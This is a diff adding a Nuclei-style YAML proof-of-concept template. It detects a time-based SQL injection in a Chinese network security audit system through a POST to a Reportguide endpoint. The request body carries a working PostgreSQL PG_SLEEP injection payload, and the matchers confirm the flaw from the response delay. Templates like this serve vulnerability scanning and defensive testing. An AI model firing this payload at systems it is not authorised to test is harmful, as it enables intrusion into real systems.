@@ -1,0 +1,37 @@
+id: poc-yaml-qmxc-ty-network-security-audit-system-sql-injection
+info:
+  name: "启明星达天珣网络安全审计系统 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 启明星达天珣网络安全审计系统
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ops/index.php?c=Reportguide&a=checkrn"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "checkname=123&tagid=123 AND 9523=(SELECT 9523 FROM PG_SLEEP({{t1}}))--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+        case-insensitive: true
+      - type: word
+        part: body
+        words:
+          - "msg"
+          - "code"
+          - "status"
+        condition: and
